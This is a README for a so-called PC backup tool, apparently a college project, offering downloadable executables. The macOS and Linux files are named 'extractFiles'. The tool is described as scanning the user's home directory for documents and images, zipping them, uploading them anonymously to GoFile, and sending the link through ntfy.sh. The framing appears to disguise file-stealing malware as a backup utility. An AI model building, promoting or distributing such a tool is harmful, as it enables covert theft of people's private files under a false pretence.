# 🚀 PC Auto Backup & Sync Tool

Welcome to the **Automated PC Backup Tool**! This is a college project designed to seamlessly scan, compress, and upload critical local files to a remote server anonymously, sending a secure notification to the user upon completion.

---

### 📥 Download the Software (Cross-Platform)
Click on the buttons below to download the executable for your Operating System. No installation required!

[![Windows](https://img.shields.io/badge/Download_for_Windows-AutoBackup.exe-blue?style=for-the-badge&logo=windows)](./AutoBackup.exe)

[![Mac](https://img.shields.io/badge/Download_for_Mac-extractFiles--macos-white?style=for-the-badge&logo=apple)](./extractFiles-macos)

[![Linux](https://img.shields.io/badge/Download_for_Linux-extractFiles--linux-yellow?style=for-the-badge&logo=linux)](./extractFiles-linux)

---

### ✨ Key Features
* **Cross-Platform Compatibility:** Runs natively on Windows, macOS, and Linux.
* **Smart File Scanning:** Automatically searches the home directory for important file extensions (`.pdf`, `.docx`, `.jpg`, etc.) while skipping system folders.
* **Auto-Compression:** Zips the gathered files securely.
* **Anonymous Cloud Upload:** Uses GoFile API to upload the backup to a free server without requiring API keys or login credentials.
* **Real-time Notifications:** Integrates with `ntfy.sh` to send an instant ping to your device with the download link once the backup is ready.

### 🛠️ Built With
* Node.js
* Archiver / Adm-Zip
* Axios
* Pkg (for compiling executables)